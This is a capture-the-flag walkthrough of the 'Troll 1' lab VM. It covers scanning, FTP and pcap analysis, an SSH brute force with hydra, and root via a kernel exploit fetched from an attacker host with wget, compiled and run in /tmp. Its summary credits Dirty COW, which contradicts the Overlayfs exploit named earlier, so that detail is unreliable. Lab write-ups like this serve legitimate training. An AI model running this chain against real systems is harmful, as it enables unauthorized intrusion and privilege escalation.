# Troll 1 – Writeup

## 1. Network Discovery

```bash
sudo netdiscover -r 192.168.56.0/24
```

Target:
```
<target_ip>
```

---

## 2. Port Scanning

```bash
sudo nmap -A -sV <target_ip>
```

### Open Ports

| Port | Service | Version |
|------|---------|----------|
| 21   | FTP     | vsftpd 3.0.2 (anonymous allowed) |
| 22   | SSH     | OpenSSH 6.6.1p1 |
| 80   | HTTP    | Apache 2.4.7 |

### Key Findings

- FTP allows anonymous login  
- robots.txt → `/secret`  
- Web hints lead to hidden directories  

---

## 3. Web Enumeration

```bash
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt
```

- Multiple troll pages discovered  
- No direct creds, but hints to continue enumeration  

---

## 4. FTP Access

```bash
ftp <target_ip>
```

Login:
```
anonymous
```

Files:
```
lol.pcap
```

Download:

```bash
get lol.pcap
```

---

## 5. Packet Analysis

Open in Wireshark:

```bash
wireshark lol.pcap
```

- Follow TCP Stream  
- Extract string:

```
sup3rs3cr3tdirlol
```

---

## 6. Hidden Directory

```bash
http://<target_ip>/sup3rs3cr3tdirlol/
```

- Found file: `roflmao`

```bash
chmod +x roflmao
./roflmao
```

Output:
```
0x0856BF
```

---

## 7. Next Stage

```bash
http://<target_ip>/0x0856BF/
```

- Directory: `good_luck`
- File: `which_one_lol.txt` → list of usernames

Also found:
```
this_folder_contains_the_password/Pass.txt
```

---

## 8. Credential Preparation

### users.txt
```
maleus
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

### pass.txt
```
Good_job_:)
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
0x0856BF
good_luck
which_one_lol.txt
0x0856BF
this_folder_contains_the_password
Pass.txt
```

---

## 9. Brute Force (SSH)

```bash
hydra -L users.txt -P pass.txt <target_ip> ssh
```

Valid creds:
```
overflow : Pass.txt
```

---

## 10. Initial Access

```bash
ssh overflow@<target_ip>
```

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 11. Privilege Escalation

Check kernel:

```bash
uname -a
```

```
Linux 3.13.0-32-generic
```

Exploit:
- Overlayfs (Exploit-DB: 37292)

---

## 12. Exploit Execution

On Kali:
```bash
python3 -m http.server 8000
```

On target:
```bash
cd /tmp
wget http://<kali_ip>:8000/troll.c
gcc troll.c -o exploit
./exploit
```

---

## 13. Root Access

```bash
whoami
```

Output:
```
root
```

Proof:

```bash
cd /root
cat proof.txt
```

```
Good job, you did it!
```

---

# Result

✔ FTP enumeration → pcap analysis  
✔ Hidden directories discovered  
✔ Credentials obtained  
✔ SSH access gained  
✔ Privilege escalation via Dirty COW  
✔ Root shell obtained  

Attack chain:
- FTP → PCAP → Web → Brute force → SSH → Kernel exploit
